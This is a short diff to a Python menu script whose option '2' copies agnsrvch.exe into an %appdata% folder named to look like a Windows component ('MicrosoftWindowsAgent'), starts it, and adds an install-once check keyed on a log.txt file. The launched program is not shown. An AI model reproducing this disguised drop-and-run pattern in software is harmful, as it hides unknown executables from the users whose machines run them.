@@ -55,12 +55,13 @@ elif option == '1':
     cmd("cls")
     cmd("Sounds.exe")
 elif option == '2':
-    cmd(rf'mkdir %appdata%\MicrosoftWindowsAgent')
-    cmd(rf'type nul > %appdata%\MicrosoftWindowsAgent\\log.txt')
-    cmd(rf"copy agnsrvch.exe %appdata%\MicrosoftWindowsAgent\\")
-    cmd(rf"start %appdata%\MicrosoftWindowsAgent\\agnsrvch.exe")
-    create_file_shortcut(f"{file_local_save}\MicrosoftWindowsAgent\\agnsrvch.exe", f"agnsrvch.dll")
-    cmd("exit")
+    if not path.exists(f"{file_local_save}\MicrosoftWindowsAgent\\log.txt"):
+        cmd(rf'mkdir %appdata%\MicrosoftWindowsAgent')
+        cmd(rf'type nul > %appdata%\MicrosoftWindowsAgent\\log.txt')
+        cmd(rf"copy agnsrvch.exe %appdata%\MicrosoftWindowsAgent\\")
+        cmd(rf"start %appdata%\MicrosoftWindowsAgent\\agnsrvch.exe")
+        create_file_shortcut(f"{file_local_save}\MicrosoftWindowsAgent\\agnsrvch.exe", f"agnsrvch.dll")
+        cmd("exit")
 else:
     print(f"{wrong_value}")
     print(f"{"\n" * 35}{wrong_value}\n{version} By {color.type.Black}{color.fg.purple}EoRoferr{color.reset}")
